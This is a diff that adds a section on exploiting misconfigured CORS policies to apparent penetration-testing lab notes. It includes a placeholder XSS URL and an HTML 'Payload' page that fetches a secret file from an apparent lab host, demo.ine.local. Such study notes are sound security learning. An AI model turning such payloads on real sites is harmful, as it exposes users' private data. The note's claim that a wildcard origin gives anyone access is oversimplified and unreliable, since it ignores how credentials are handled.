@@ -96,3 +96,36 @@ If the server responds with:
 Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:
 
     https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+
+
+## Leveraging misconfigured CORS policy.
+
+If the response header contains: 
+
+    Access-Control-Allow-Origin: *
+
+Then any user can get access to the resource.
+
+### Payload
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+            <meta charset="utf-8">
+            <title>Simple Page</title>
+            <script type="text/javascript">
+                    fetch("http://demo.ine.local/secret-cors-1.php")
+                    .then(resp => resp.text())
+                    .then(resp => {
+                            console.log(resp)
+                    }).catch(err => {
+                            console.log(err);
+                    })
+            </script>
+    </head>
+    <body>
+            <h1>Hello World!</h1>
+    </body>
+    </html>
+
+The fetch fn will get the data of this link
